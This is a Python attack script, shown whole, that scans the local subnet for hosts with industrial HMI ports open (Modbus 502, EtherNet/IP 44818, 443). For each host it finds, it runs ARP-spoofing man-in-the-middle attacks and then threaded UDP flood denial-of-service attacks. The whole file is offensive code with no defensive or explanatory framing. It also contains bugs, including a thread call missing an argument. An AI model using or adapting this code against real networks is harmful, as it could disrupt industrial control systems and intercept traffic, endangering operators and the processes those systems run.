import os
import random
import socket
import subprocess
import threading
import time

ip_list = []
hmi = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
sent = 0

def mitm(victim_ip, gateway_ip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    proc = subprocess.Popen(args=["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", gateway_ip], stdout=subprocess.PIPE)
    time.sleep(30)
    proc.kill()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def dos_attack(ip, port):
    global sent, bytes
    while True:
        sock.sendto(bytes, (ip, port))


def attack(victim_ip, port, gateway_ip):
    mitm(victim_ip, gateway_ip)
    time.sleep(30)

    # Until the mitm Done
    for i in range(20):
        threading.Thread(target=dos_attack, args=[victim_ip, port]).start()


def ip_exist(ip, gateway):
    global ip_list, hmi
    hmi_ports = (502, 44818, 443)
    res = subprocess.run(["ping", ip], capture_output=True)
    if "Approximate round" in res.stdout.decode("UTF-8"):
        ip_list.append(ip)
        for port in hmi_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            # returns an error indicator
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"Start attack --> {ip}:{port}")
                for i in range(50):
                    threading.Thread(target=attack, args=[ip, port, gateway]).start()
                hmi.update({ip: port})

def ipscanning():
    global ip_list, hmi
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    local_ip = s.getsockname()[0]
    build_ip = local_ip.split(".")
    builder = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}"
    print(f"[+] Local IP --> {local_ip}")
    print(f"[+] Scanning ip --> {builder}.255\n ")

    for class_d in range(1, 255):
        ip = f"{builder}.{class_d}"
        while threading.active_count() > 400:
            pass
        threading.Thread(target=ip_exist, args=[ip]).start()

ipscanning()